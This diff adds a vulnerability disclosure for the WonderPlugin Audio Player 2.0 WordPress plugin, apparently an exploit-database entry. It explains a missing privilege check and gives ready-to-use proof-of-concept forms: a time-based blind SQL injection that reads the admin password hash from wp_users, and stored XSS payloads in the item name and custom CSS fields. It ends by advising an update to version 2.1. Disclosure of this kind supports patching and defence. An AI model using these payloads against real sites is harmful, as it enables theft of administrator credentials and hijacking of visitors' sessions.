@@ -1,0 +1,45 @@
+# Exploit Title: WonderPlugin Audio Player 2.0 Blind SQL Injection and XSS
+# Date: 20-01-2015
+# Software Link: http://www.wonderplugin.com/wordpress-audio-player/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+
+1. Description
+  
+wp_ajax_save_item() is accessible for every registered user (admin privileges are not checked).
+
+save_item() uses is_id_exist() in which $id is not escaped properly.
+
+2. Proof of Concept
+
+Login as standard user (created using wp-login.php?action=register) then:
+
+<form method="post" action="http://wordpress-url/wp-admin/admin-ajax.php?action=wonderplugin_audio_save_item">
+    <input type="text" name="item[id]" value="1 UNION (SELECT 1, 2, 3, 4, IF(substr(user_pass,1,1) = CHAR(36), SLEEP(5), 0) FROM `wp_users` WHERE ID = 1)">
+    <input type="submit" value="Hack!">
+</form>
+
+This SQL will check if first password character user ID=1 is "$".
+
+If yes it will sleep 5 seconds.
+
+For XSS use:
+
+<form method="post" action="http://wordpress-url/wp-admin/admin-ajax.php?action=wonderplugin_audio_save_item">
+    <input type="hidden" name="item[id]" value="1">
+    <input type="text" name="item[name]" value='<script>alert(String.fromCharCode(88,83,83));</script>'>
+    <input type="text" name="item[customcss]" value='</style><script>alert(String.fromCharCode(88,83,83));</script>'>
+    <input type="submit" value="Hack!">
+</form>
+
+It will be visible on every page where shortcode wonderplugin_audio is used and also in admin panel:
+
+http://wordpress-url/wp-admin/admin.php?page=wonderplugin_audio_show_items
+
+http://security.szurek.pl/wonderplugin-audio-player-20-blind-sql-injection-and-xss.html
+
+3. Solution:
+  
+Update to version 2.1
